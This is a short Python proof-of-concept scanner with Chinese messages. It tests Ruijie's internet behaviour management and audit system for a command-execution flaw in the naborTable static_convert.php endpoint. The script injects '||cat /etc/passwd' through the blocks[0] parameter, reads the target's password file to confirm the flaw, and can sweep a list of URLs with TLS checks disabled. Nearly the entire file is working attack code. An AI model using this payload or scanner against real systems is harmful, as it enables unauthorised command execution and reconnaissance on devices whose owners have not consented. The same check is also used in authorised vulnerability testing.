#!/usr/bin/env python
# -*- coding: utf-8 -*-
import requests
import argparse
import time
from urllib3.exceptions import InsecureRequestWarning

RED = '\033[91m'
RESET = '\033[0m'
# 忽略不安全请求的警告
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

def check_vulnerability(url):
    try:
        # 构造完整的攻击URL
        attack_url = url.rstrip('/') + "/view/IPV6/naborTable/static_convert.php?blocks[0]=||cat%20%2fetc%2fpasswd"
  
        response = requests.get(attack_url, verify=False, timeout=10)
  
        if response.status_code == 200 and 'root' in response.text:
            print(f"{RED}URL [{url}] 可能存在锐捷统一上网行为管理与审计系统naborTable命令执行漏洞{RESET}")
        else:
            print(f"URL [{url}] 不存在漏洞")
    except requests.RequestException as e:
        print(f"URL [{url}] 请求失败: {e}")

def main():
    parser = argparse.ArgumentParser(description='检测目标地址是否存在锐捷统一上网行为管理与审计系统naborTable命令执行漏洞')
    parser.add_argument('-u', '--url', help='指定目标地址')
    parser.add_argument('-f', '--file', help='指定包含目标地址的文本文件')

    args = parser.parse_args()

    if args.url:
        if not args.url.startswith("http://") and not args.url.startswith("https://"):
            args.url = "http://" + args.url
        check_vulnerability(args.url)
    elif args.file:
        with open(args.file, 'r') as file:
            urls = file.read().splitlines()
            for url in urls:
                if not url.startswith("http://") and not url.startswith("https://"):
                    url = "http://" + url
                check_vulnerability(url)

if __name__ == '__main__':
    main()